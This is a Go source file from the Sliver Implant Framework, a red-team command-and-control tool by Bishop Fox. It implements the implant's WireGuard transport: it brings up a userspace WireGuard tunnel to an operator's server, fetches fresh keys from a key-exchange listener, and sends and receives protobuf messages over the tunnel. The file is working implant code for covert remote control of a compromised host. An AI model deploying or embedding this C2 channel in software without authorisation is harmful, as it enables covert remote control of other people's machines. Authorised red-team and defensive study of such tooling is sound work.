package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.WGc2Enabled}}

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/bishopfox/sliver/implant/sliver/netstack"
	"github.com/golang/protobuf/proto"
	"golang.zx2c4.com/wireguard/conn"
	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/tun"
)

var (
	serverTunIP = "100.64.0.1" // Don't let user configure this for now
	tunnelNet   *netstack.Net
	tunAddress  string
)

func GetTNet() *netstack.Net {
	return tunnelNet
}

func GetTUNAddress() string {
	return tunAddress
}

// socketWGWriteEnvelope - Writes a message to the wireguard socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the receiver can delimit messages properly
func socketWGWriteEnvelope(connection net.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

func socketWGWritePing(connection net.Conn) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&sliverpb.Ping{Nonce: 31337})
	envelope := sliverpb.Envelope{
		Type: sliverpb.MsgPing,
		Data: pingBuf,
	}
	return socketWGWriteEnvelope(connection, &envelope)
}

// socketWGReadEnvelope - Reads a message from the wireguard connection using length prefix framing
func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(dataLengthBuf) == 0 || connection == nil {
		panic("[[GenerateCanary]]")
	}
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}

// wgSocketConnect - Get a wg connection or die trying
func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, error) {

	_, dev, tnet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)

	dev.Up()

	// {{if .Config.Debug}}
	log.Printf("Intial wg connection. Attempting to connect to wg key exchange listener")
	// {{end}}

	keyExchangeConnection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgKeyExchangePort))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect to wg key exchange listener: %v", err)
		// {{end}}
		return nil, nil, err
	}

	privKey, pubKey, newIP := doKeyExchange(keyExchangeConnection)

	// {{if .Config.Debug}}
	log.Printf("Signaling wg device to go down")
	// {{end}}

	// Close initial wireguard connection
	err = dev.Down()

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to close device.Device: %s", err)
		// {{end}}
		return nil, nil, err
	}

	// Bring up second wireguard connection using retrieved keys and IP
	_, dev, tnet, err = bringUpWGInterface(address, port, privKey, pubKey, newIP)

	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgTcpCommsPort))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect to sliver listener: %v", err)
		// {{end}}
		return nil, nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("Successfully connected to sliver listener")
	// {{end}}
	tunnelNet = tnet
	tunAddress = newIP
	return connection, dev, nil
}

// bringUpWGInterface - First ceates an inet.af network stack.
// then creates a Wireguard device/interface and applies configuration
func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
	tun, tnet, err := netstack.CreateNetTUN(
		[]net.IP{net.ParseIP(netstackTunIP)},
		[]net.IP{net.ParseIP("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
		1420)
	if err != nil {
		// {{if .Config.Debug}}
		log.Panic(err)
		// {{end}}
	}

	wgLogLevel := device.LogLevelSilent
	// {{if .Config.Debug}}
	wgLogLevel = device.LogLevelVerbose
	// {{end}}

	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
	wgConf := bytes.NewBuffer(nil)
	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
	fmt.Fprintf(wgConf, "endpoint=%s:%d\n", address, port)
	fmt.Fprintf(wgConf, "allowed_ip=%s/0\n", "0.0.0.0")

	// {{if .Config.Debug}}
	log.Printf("Configuring wg device with: %s", wgConf.String())
	// {{end}}

	if err := dev.IpcSetOperation(bufio.NewReader(wgConf)); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to set wg device config: %s", err)
		// {{end}}
		return nil, nil, nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("Successfully set wg device config")
	// {{end}}

	return tun, dev, tnet, nil
}

// doKeyExchange - Connect to key exchange listener and retrieve new dynamic wg keys
func doKeyExchange(conn net.Conn) (string, string, string) {
	// {{if .Config.Debug}}
	log.Printf("Connected to key exchange listener")
	// {{end}}
	defer conn.Close()

	// 129 = 64 byte key + 1 byte delimiter + 64 byte key + 1 byte delimiter + 16 byte ip address
	buff := make([]byte, 146)
	buffReader := bufio.NewReader(conn)

	_, err := io.ReadFull(buffReader, buff)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to read wg keys from key exchange listener: %s", err)
		// {{end}}
	}

	stringSlice := strings.Split(string(buff), "|")
	// {{if .Config.Debug}}
	log.Printf("Retrieved new keys, priv:%s, pub:%s, ip:%s", stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String())
	// {{end}}
	return stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String()
}

// {{end}} -WGc2Enabled
